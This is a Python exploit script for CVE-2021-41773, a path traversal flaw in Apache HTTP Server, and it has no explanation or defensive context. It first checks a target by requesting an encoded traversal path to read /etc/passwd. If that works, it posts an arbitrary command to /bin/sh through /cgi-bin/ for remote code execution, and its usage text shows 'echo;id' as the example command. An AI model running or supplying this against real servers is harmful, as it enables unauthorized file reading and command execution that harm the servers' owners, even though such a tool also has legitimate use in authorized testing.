import requests, sys

def check(url):
    resp = requests.get('%s/icons/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/etc/passwd' % (url), verify=False)
    if 'root:x:' in resp.text:
        return True
    return False

def rce(url, cmd):
    resp = requests.post('%s/cgi-bin/.%%2e/.%%2e/.%%2e/.%%2e/bin/sh' % (url), data=cmd)
    print(resp.text)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: %s CVE-2021-41773.py <url> <cmd>' % (sys.argv[0]))
        print('Exam : %s CVE-2021-41773.py http://pwnme.me \'echo;id\'' % (sys.argv[0]))
        exit(1)

    url = sys.argv[1].strip('/')
    cmd = sys.argv[2]
    if check(url):
        rce(url, cmd)
    else:
        print('Not Vulnerability')